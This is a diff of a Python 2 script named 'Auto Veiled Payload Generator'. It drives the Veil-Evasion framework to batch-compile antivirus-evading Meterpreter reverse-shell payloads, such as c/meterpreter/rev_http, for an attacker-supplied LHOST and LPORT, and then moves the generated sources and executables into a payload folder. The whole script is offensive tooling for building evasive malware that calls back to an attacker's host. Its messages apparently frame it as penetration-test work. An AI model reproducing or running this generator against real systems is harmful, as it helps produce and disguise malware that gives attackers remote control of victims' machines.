@@ -1,7 +1,22 @@
+'''
+Mert Hacipoglu
+Symturk
+'''
+
+#!/usr/local/bin/python
+# -*- coding: utf-8 -*-
+
 import os
 import argparse
 
 veil_path = "/root/Veil-Evasion/Veil-Evasion.py"
+
+parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
+parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
+parser.add_argument('-LPORT',metavar='PORT NO', type=str,help="Port No",required=True)
+parser.add_argument('-o',metavar='path/to/payloads',type=dir,help='Directory to move all payloads\nDefault is: /home/<user>/payloads/')
+
+args = parser.parse_args()
 
 payload_list={
               ("c/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
@@ -34,15 +49,9 @@ payload_list={
 def CreatePayloadCommand(payload_tuple,LHOST,LPORT):
     file_name=payload_tuple[0].split("/")
     file_name=file_name[len(file_name)-3]+"_"+file_name[len(file_name)-2]+"_"+file_name[len(file_name)-1]
-    print "[!] "+file_name+" created..." 
     return "python "+veil_path+" -p "+payload_tuple[0]+" -c "+payload_tuple[1]+" LHOST="+LHOST+" LPORT="+LPORT+" --overwrite -o "+file_name
     
-parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
-parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
-parser.add_argument('-LPORT',metavar='PORT NO', type=str,help="Port No",required=True)
-parser.add_argument('-o',metavar='path/to/payloads',type=dir,help='Directory to move all payloads\nDefault is: /home/<user>/payloads/')
 
-args = parser.parse_args()
 
 #check output folder
 if args.o is None:
@@ -53,13 +62,14 @@ else:
 if not os.path.exists(path):
     os.makedirs(path)
 
-# read payload list from file
+
 print "Payloads will be created as your command...\nNothing can stop you to go for a smoke...\nSo... GO NOW!"
 for payload in payload_list:
     os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT)+" > /dev/null") #silenced mode
+    print "\t[!] Payload: "+payload[0]+" created..." 
 print "All payloads created without a single error :)\nLet me move them for you into: "+path
-os.system("mv /usr/share/veil-evasion/source/* "+path+"/.")
+os.system("mv /usr/share/veil-evasion/source/* "+path+".")
 print "\t[!]Source Codes Moved"
-os.system("mv /usr/share/veil-evasion/compiled/* "+path+"/.")
+os.system("mv /usr/share/veil-evasion/compiled/* "+path+".")
 print "\t[!]Payloads Moved"
-print "I'm done...\nHope to see you again"    
+print "I'm done...\nHope to see you again on another test..."    
